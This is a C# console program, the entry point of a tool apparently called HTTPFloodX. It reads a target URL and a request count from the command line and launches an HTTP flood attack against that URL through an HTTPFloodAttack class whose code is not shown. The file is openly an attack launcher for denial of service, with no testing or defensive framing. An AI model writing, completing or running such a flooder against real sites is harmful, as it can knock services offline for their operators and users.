using HTTPFloodX;
using HTTPFloodX.Flooders;
using HTTPFloodX.Flooders.Interfaces;

class Program
{
    static async Task Main(string[] args)
    {
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine(AsciiArt.Display());
        
        Console.ForegroundColor = ConsoleColor.Red;
        // Check if both target URL and request count are provided as command-line arguments
        if (args.Length < 2)
        {
            Console.WriteLine("Error: There are no parameters.");
            return;
        }

        // Extract target URL and request count from command-line arguments
        string targetUrl = args[0];
        if (!Uri.TryCreate(targetUrl, UriKind.Absolute, out _))
        {
            Console.WriteLine("Invalid target URL. Please provide a valid URL.");
            return;
        }

        if (!int.TryParse(args[1], out int requestCount) || requestCount <= 0)
        {
            Console.WriteLine("Invalid request count. Please provide a positive integer value for request count.");
            return;
        }

        Console.ForegroundColor = ConsoleColor.White;
        
        // Create an instance of HTTPFloodAttack with provided target URL and request count
        IHTTPFloodAttack floodAttack = new HTTPFloodAttack(targetUrl, requestCount);

        // Start the attack asynchronously
        await floodAttack.StartAttackAsync();

        Console.WriteLine("Attack completed.");
    }
}